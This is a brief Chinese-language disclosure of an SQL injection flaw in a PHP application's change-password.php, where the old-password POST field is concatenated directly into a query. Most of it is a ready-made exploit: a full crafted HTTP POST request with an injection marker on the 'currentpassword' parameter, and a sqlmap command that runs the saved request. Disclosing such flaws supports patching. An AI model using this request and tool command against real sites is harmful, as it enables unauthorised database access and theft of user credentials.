change-password.php文件中$oldpassword直接拼接到sql语句中，而$oldpassword是通过POST请求直接获取的


![alt text](change-password.php%20sql%20inject-1.png)

构造恶意数据包
POST /change-password.php HTTP/1.1
Host: test.jc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://test.jc/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Cookie: PHPSESSID=6keshioktp2eu9p7fg0ent8hk2
Content-Type: application/x-www-form-urlencoded

update=a&currentpassword=aa*

sqlmap sqlmap -r post.txt


![alt text](change-password.php%20sql%20inject-2.png)
